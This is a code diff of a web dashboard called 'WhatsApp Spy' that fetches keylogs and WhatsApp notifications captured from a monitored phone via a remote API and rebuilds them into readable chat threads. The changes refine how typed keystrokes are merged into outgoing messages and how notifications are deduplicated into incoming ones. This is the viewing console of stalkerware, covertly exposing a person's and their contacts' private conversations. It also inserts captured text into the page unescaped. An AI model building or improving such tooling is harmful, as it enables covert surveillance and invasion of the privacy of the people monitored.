@@ -3,13 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Spy (Final Fix)</title>
+    <title>WhatsApp Spy (Strict Mode)</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        /* Base Reset */
         body { margin: 0; font-family: 'Segoe UI', sans-serif; background-color: #111b21; color: #e9edef; display: flex; height: 100vh; overflow: hidden; }
         
-        /* Sidebar */
-        .sidebar { width: 30%; max-width: 350px; background: #202c33; border-right: 1px solid #374045; display: flex; flex-direction: column; }
+        /* Sidebar (Contact List) */
+        .sidebar { width: 35%; max-width: 400px; background: #202c33; border-right: 1px solid #374045; display: flex; flex-direction: column; z-index: 20; }
         .sidebar-header { padding: 15px; background: #202c33; border-bottom: 1px solid #374045; display: flex; justify-content: space-between; align-items: center; }
         .contact-list { flex: 1; overflow-y: auto; }
         
@@ -19,31 +20,58 @@
         .avatar { width: 45px; height: 45px; background: #00a884; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-size: 18px; font-weight: bold; flex-shrink: 0; }
         .contact-info { flex: 1; overflow: hidden; }
         .contact-name { font-size: 16px; font-weight: 500; color: #e9edef; margin-bottom: 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        .last-msg { font-size: 13px; color: #8696a0; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-
+        
         /* Chat Area */
-        .chat-area { flex: 1; background-color: #0b141a; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); display: flex; flex-direction: column; position: relative; }
+        .chat-area { flex: 1; background-color: #0b141a; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); display: flex; flex-direction: column; position: relative; width: 100%; }
         
-        .chat-header { padding: 10px 15px; background: #202c33; display: flex; align-items: center; border-bottom: 1px solid #374045; height: 60px; }
+        .chat-header { padding: 10px 15px; background: #202c33; display: flex; align-items: center; border-bottom: 1px solid #374045; height: 60px; z-index: 10; }
         .back-btn { display: none; margin-right: 15px; color: #e9edef; font-size: 20px; cursor: pointer; }
-        .chat-title { font-size: 16px; font-weight: 600; }
-
-        .messages { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; }
         
-        /* Bubbles */
-        .msg { max-width: 65%; padding: 6px 10px; border-radius: 8px; font-size: 14.2px; position: relative; word-wrap: break-word; line-height: 1.4; box-shadow: 0 1px 0.5px rgba(0,0,0,0.13); }
-        .msg.incoming { background: #202c33; align-self: flex-start; border-top-left-radius: 0; }
-        .msg.outgoing { background: #005c4b; align-self: flex-end; border-top-right-radius: 0; }
-
-        .msg-meta { display: flex; justify-content: flex-end; align-items: center; gap: 4px; margin-top: 2px; }
-        .time { font-size: 11px; color: #8696a0; }
+        .messages { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 4px; padding-bottom: 30px; }
         
-        /* Mobile */
+        /* --- BUBBLES (Responsive Fix) --- */
+        .msg { 
+            max-width: 75%; /* Phone ke liye size fix */
+            width: fit-content;
+            padding: 6px 10px; 
+            border-radius: 8px; 
+            font-size: 14.5px; 
+            position: relative; 
+            word-wrap: break-word; /* Long text todega */
+            word-break: break-word;
+            line-height: 1.4; 
+            margin-bottom: 4px;
+            box-shadow: 0 1px 0.5px rgba(0,0,0,0.13); 
+        }
+        
+        /* STRICT COLORS */
+        .msg.incoming { 
+            background: #202c33; /* Dark Grey */
+            align-self: flex-start; /* LEFT SIDE */
+            border-top-left-radius: 0; 
+            color: #fff;
+        }
+        
+        .msg.outgoing { 
+            background: #005c4b; /* Green */
+            align-self: flex-end; /* RIGHT SIDE */
+            border-top-right-radius: 0; 
+            color: #fff;
+        }
+
+        .msg-meta { display: flex; justify-content: flex-end; align-items: center; gap: 4px; margin-top: 2px; opacity: 0.7; }
+        .time { font-size: 10px; }
+        
+        /* Status Bar */
+        .status-bar { font-size: 11px; text-align: center; padding: 5px; background: #182229; color: #8696a0; }
+
+        /* --- MOBILE VIEW --- */
         @media(max-width: 768px) {
-            .sidebar { width: 100%; position: absolute; z-index: 10; height: 100%; }
-            .chat-area { width: 100%; position: absolute; z-index: 5; height: 100%; }
-            .sidebar.hidden { display: none; }
+            .sidebar { width: 100%; position: absolute; height: 100%; }
+            .chat-area { width: 100%; position: absolute; height: 100%; z-index: 10; }
+            .sidebar.hidden { display: none; } /* Hide sidebar when chat is open */
             .back-btn { display: block; }
+            .msg { max-width: 85%; font-size: 14px; } /* Thoda aur bada message mobile par */
         }
     </style>
 </head>
@@ -51,31 +79,39 @@
 
     <div class="sidebar" id="sidebar">
         <div class="sidebar-header">
-            <span>Chats <span style="font-size:10px; color:#00a884;">(Live Fixed)</span></span>
-            <i class="fas fa-trash-alt" onclick="resetData()" style="cursor:pointer; font-size:14px; color:#f15c6d;" title="Clear & Reset"></i>
+            <span>Chats <span style="font-size:10px; color:#00a884; border:1px solid #00a884; padding:2px 4px; border-radius:4px;">STRICT MODE</span></span>
+            <i class="fas fa-sync" id="refreshIcon" onclick="forceSync()" style="cursor:pointer; font-size:14px; margin-right:15px;" title="Force Reload"></i>
+            <i class="fas fa-trash-alt" onclick="resetData()" style="cursor:pointer; font-size:14px; color:#f15c6d;" title="Clear All"></i>
         </div>
+        <div class="status-bar" id="statusBar">Waiting for data...</div>
         <div class="contact-list" id="contactList">
-            <div style="padding:20px; text-align:center; color:#8696a0;">Connecting...</div>
-        </div>
+            </div>
     </div>
 
     <div class="chat-area">
         <div class="chat-header" id="chatHeader" style="display:none;">
             <i class="fas fa-arrow-left back-btn" onclick="showSidebar()"></i>
             <div class="avatar" id="headerAvatar" style="width:35px; height:35px; font-size:14px; margin-right:10px;"></div>
-            <span class="chat-title" id="chatTitle">User</span>
+            <div style="display:flex; flex-direction:column;">
+                <span class="chat-title" id="chatTitle">User</span>
+                <span style="font-size:11px; color:#8696a0;">WhatsApp</span>
+            </div>
         </div>
         
         <div class="messages" id="msgBox">
-            <div style="display:flex; justify-content:center; align-items:center; height:100%; color:#8696a0;">Select a chat</div>
+            <div style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100%; color:#8696a0;">
+                <i class="fab fa-whatsapp" style="font-size:40px; margin-bottom:10px;"></i>
+                <span>Select a chat to view history</span>
+            </div>
         </div>
     </div>
 
     <script>
+        // --- CONFIG ---
         const urlParams = new URLSearchParams(window.location.search);
         const deviceId = urlParams.get('id');
-        // KEY CHANGE: Version 7 - Fresh start
-        const STORAGE_KEY = `whatsapp_spy_clean_v7_${deviceId}`; 
+        // Nayi ID taki purana kharab data na dikhe
+        const STORAGE_KEY = `whatsapp_spy_strict_v9_${deviceId}`; 
 
         const API_KEYLOGS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/keylogs`;
         const API_NOTIFS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;
@@ -83,20 +119,24 @@
         let allChats = {}; 
         let currentChatUser = null;
 
-        // 1. Initial Load
+        // 1. Start
         function loadStorage() {
             const saved = localStorage.getItem(STORAGE_KEY);
             if (saved) {
-                try {
-                    allChats = JSON.parse(saved);
-                    renderContacts();
-                } catch(e) { console.error("Data error", e); }
+                try { allChats = JSON.parse(saved); renderContacts(); } 
+                catch(e) { console.error("Data corrupted, resetting", e); }
             }
         }
 
-        // 2. Fetch Data
+        // 2. Fetch Data (Strict Logic)
         async function syncData() {
-            if (!deviceId) return;
+            if (!deviceId) {
+                document.getElementById('statusBar').innerText = "Error: No Device ID";
+                return;
+            }
+            
+            document.getElementById('refreshIcon').classList.add('fa-spin');
+            
             try {
                 const [logs, notifs] = await Promise.all([
                     fetch(API_KEYLOGS).then(r => r.json()).catch(()=>[]),
@@ -105,80 +145,111 @@
 
                 let hasNewData = false;
 
-                // OUTGOING (Keylogs)
+                // --- PROCESS OUTGOING (KEYLOGS) ---
+                // Rule: Agar Keylog hai, to wo 100% Outgoing (Right) hai.
                 logs.forEach(item => {
-                    if (item.text && (item.type === 'outgoing_keylog' || !item.packageName)) {
+                    // Check: Must be Outgoing type OR valid WhatsApp text without package
+                    if (item.type === 'outgoing_keylog' || (item.appName === 'WhatsApp' && !item.packageName)) {
                         if(processMessage(item.title || "Unknown", item.text, item.timestamp, 'outgoing')) hasNewData = true;
                     }
                 });
 
-                // INCOMING (Notifications)
-                // Sort by time so we process in order
+                // --- PROCESS INCOMING (NOTIFICATIONS) ---
+                // Rule: Notification (com.whatsapp) sirf Incoming (Left) hoti hai.
+                // Sort by PostTime to handle stacking order
                 notifs.sort((a,b) => a.postTime - b.postTime);
+                
                 notifs.forEach(item => {
                     if(item.packageName && item.packageName.includes('whatsapp') && item.text) {
+                        // Strict Check: Ye Incoming hi hai
                         if(processMessage(item.title, item.text, item.postTime, 'incoming')) hasNewData = true;
                     }
                 });
 
+                document.getElementById('statusBar').innerText = `Last updated: ${new Date().toLocaleTimeString()}`;
+                
                 if (hasNewData) {
                     saveStorage();
                     renderContacts();
                     if(currentChatUser) renderMessages(currentChatUser);
                 }
-            } catch(e) { console.log(e); }
+
+            } catch(e) { 
+                console.log(e); 
+            } finally {
+                document.getElementById('refreshIcon').classList.remove('fa-spin');
+            }
         }
 
-        // --- 3. MAIN LOGIC (THE FIX IS HERE) ---
+        // --- 3. THE BRAIN (Logic Fix) ---
         function processMessage(user, text, time, type) {
             if (!user || !text || text.trim() === "") return false;
             
-            let ts = parseInt(time);
-            if (!ts || isNaN(new Date(ts).getTime())) return false; 
-
-            // Filter Junk
-            if (user.includes("WhatsApp")) return false; 
-            if (text.toLowerCase().includes("new messages")) return false;
-            if (text.toLowerCase().includes("incoming voice call")) return false;
+            // Junk Cleaners
+            if (user.includes("WhatsApp") && user.length < 15) return false; // Ignore "WhatsApp" user
+            if (text.includes("new messages")) return false; 
+            if (text.includes("incoming voice call")) return false;
             if (text.includes("Checking for new messages")) return false;
+
+            let ts = parseInt(time);
+            if (!ts || isNaN(new Date(ts).getTime())) return false;
 
             if (!allChats[user]) allChats[user] = [];
             const history = allChats[user];
             const lastMsg = history[history.length - 1];
 
-            // ------------------------------------------------
-            // LOGIC FIX: Handle Stacking & Duplication
-            // ------------------------------------------------
+            // --- STRICT DEDUPLICATION ---
+            
+            // Check 1: Exact Duplicate (Same text, same type, within 5 seconds)
+            // Fixes: "Confuse ho jata hai"
+            const isDuplicate = history.some(m => 
+                m.text === text && 
+                m.type === type && // Important: Outgoing aur Incoming mix nahi honge
+                Math.abs(m.time - ts) < 5000
+            );
+            if (isDuplicate) return false;
 
-            if (lastMsg) {
-                // RULE 1: STRICT DUPLICATE CHECK
-                // Agar message same hai aur time 2 second ke andar hai -> IGNORE
-                if (text === lastMsg.text && Math.abs(ts - lastMsg.time) < 2000) {
-                    return false;
-                }
-
-                // RULE 2: INCOMING STACKING FIX (Cut the repeated part)
-                if (type === 'incoming' && lastMsg.type === 'incoming') {
-                    // Agar naya message purane message se shuru hota hai
-                    // Eg: Last: "Hello" | New: "Hello Kya hal hai"
-                    if (text.startsWith(lastMsg.text)) {
-                        // Purana hissa kaat do
-                        let newPart = text.substring(lastMsg.text.length).trim();
-                        
-                        // Agar katne ke baad kuch bacha hi nahi, to ye duplicate hai
-                        if (newPart === "") return false;
-
-                        // Text ko update kar do sirf naye hisse ke sath
-                        text = newPart; 
+            // --- STACKING FIX (Incoming Only) ---
+            if (type === 'incoming' && lastMsg && lastMsg.type === 'incoming') {
+                // Scenario: 
+                // Msg 1: "Hi"
+                // Msg 2: "Hi \n Kaise ho" (Notification Stack)
+                
+                // Agar naya text purane text se start hota hai
+                if (text.startsWith(lastMsg.text)) {
+                    const cleanText = text.substring(lastMsg.text.length).trim();
+                    if (cleanText.length > 0) {
+                        text = cleanText; // Sirf naya hissa lo
+                    } else {
+                        return false; // Ye duplicate hai
                     }
+                }
+                
+                // Agar naye text mein purana text kahin bhi chipka hai (Regex clean)
+                // Remove repeated lines
+                const lines = text.split('\n');
+                const lastLines = lastMsg.text.split('\n');
+                // Agar naya message ka pehla line purane message ka last line hai
+                if (lines[0] === lastLines[lastLines.length-1]) {
+                     lines.shift(); // Remove duplicate line
+                     text = lines.join('\n').trim();
+                     if(text === "") return false;
                 }
             }
 
-            // Save Valid Message
+            // --- OUTGOING TYPING FIX ---
+            if (type === 'outgoing' && lastMsg && lastMsg.type === 'outgoing') {
+                // Typing update: "Hel" -> "Hello"
+                if (text.startsWith(lastMsg.text) && Math.abs(ts - lastMsg.time) < 10000) {
+                    history.pop(); // Remove "Hel"
+                    history.push({ text, time: ts, type }); // Add "Hello"
+                    return true;
+                }
+            }
+
+            // FINAL ADD
             history.push({ text, time: ts, type });
-            
-            // Sort by time to keep order correct
-            history.sort((a,b) => a.time - b.time); 
+            history.sort((a,b) => a.time - b.time);
             return true;
         }
 
@@ -187,10 +258,14 @@
         }
 
         function resetData() {
-            if(confirm("Sab delete karke refresh karein?")) {
+            if(confirm("Delete all history?")) {
                 localStorage.removeItem(STORAGE_KEY);
                 location.reload();
             }
+        }
+        
+        function forceSync() {
+            syncData();
         }
 
         // --- RENDER UI ---
@@ -203,18 +278,21 @@
             });
 
             if(users.length === 0) {
-                list.innerHTML = `<div style="padding:20px;text-align:center;color:#666;">No chats found yet</div>`;
+                list.innerHTML = `<div style="padding:20px;text-align:center;color:#666;">Waiting for new messages...<br><small>Background activity depends on phone OS</small></div>`;
                 return;
             }
 
             list.innerHTML = "";
             users.forEach(user => {
-                const last = allChats[user][allChats[user].length - 1];
+                const msgs = allChats[user];
+                const last = msgs[msgs.length - 1];
                 const active = currentChatUser === user ? 'active' : '';
                 const timeStr = new Date(last.time).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
                 
-                let preview = last.text;
-                if(last.type === 'outgoing') preview = `<i class="fas fa-check"></i> ${preview}`;
+                let preview = last.text.substring(0, 30);
+                if(last.text.length > 30) preview += "...";
+                
+                const icon = last.type === 'outgoing' ? '<i class="fas fa-check" style="color:#53bdeb; font-size:10px;"></i> ' : '';
 
                 list.innerHTML += `
                     <div class="contact ${active}" onclick="openChat('${user}')">
@@ -223,7 +301,7 @@
                             <div class="contact-name" style="display:flex; justify-content:space-between;">
                                 ${user} <span style="font-size:11px; color:#8696a0; font-weight:normal;">${timeStr}</span>
                             </div>
-                            <div class="last-msg">${preview}</div>
+                            <div class="last-msg">${icon}${preview}</div>
                         </div>
                     </div>
                 `;
@@ -234,9 +312,21 @@
             currentChatUser = user;
             document.getElementById('chatTitle').innerText = user;
             document.getElementById('headerAvatar').innerText = user[0].toUpperCase();
-            document.getElementById('chatHeader').style.display = 'flex';
-            if(window.innerWidth < 768) document.getElementById('sidebar').classList.add('hidden');
+            
+            const header = document.getElementById('chatHeader');
+            header.style.display = 'flex';
+            
+            // Mobile: Hide sidebar
+            if(window.innerWidth < 768) {
+                document.getElementById('sidebar').classList.add('hidden');
+            }
+            
             renderMessages(user);
+        }
+
+        function showSidebar() {
+            document.getElementById('sidebar').classList.remove('hidden');
+            currentChatUser = null;
         }
 
         function renderMessages(user) {
@@ -249,34 +339,41 @@
             msgs.forEach(m => {
                 const d = new Date(m.time);
                 const dStr = d.toLocaleDateString();
+                
+                // Date Separator
                 if (dStr !== lastDate) {
-                    box.innerHTML += `<div style="align-self:center; background:#1f2c34; padding:5px 12px; border-radius:8px; font-size:12px; color:#8696a0; margin:10px 0;">${dStr}</div>`;
+                    box.innerHTML += `<div style="align-self:center; background:#182229; padding:5px 12px; border-radius:8px; font-size:11px; color:#8696a0; margin:15px 0;">${dStr}</div>`;
                     lastDate = dStr;
                 }
 
                 const tStr = d.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit', hour12:false});
+                
                 const div = document.createElement('div');
-                div.className = `msg ${m.type}`; 
+                div.className = `msg ${m.type}`; // Strict Class Application
+                
+                // Checkmark for outgoing
+                const tick = m.type === 'outgoing' ? '<i class="fas fa-check-double" style="color:#53bdeb; font-size:10px;"></i>' : '';
+
                 div.innerHTML = `
                     ${m.text}
                     <div class="msg-meta">
                         <span class="time">${tStr}</span>
-                        ${m.type === 'outgoing' ? '<i class="fas fa-check-double" style="color:#53bdeb; font-size:10px;"></i>' : ''}
+                        ${tick}
                     </div>
                 `;
                 box.appendChild(div);
             });
+            
+            // Auto scroll to bottom
             box.scrollTop = box.scrollHeight;
         }
 
-        function showSidebar() {
-            document.getElementById('sidebar').classList.remove('hidden');
-            currentChatUser = null;
-        }
-
+        // Init
         loadStorage();
         syncData();
-        setInterval(syncData, 4000);
+        
+        // Fast polling for responsiveness
+        setInterval(syncData, 3000);
 
     </script>
 </body>
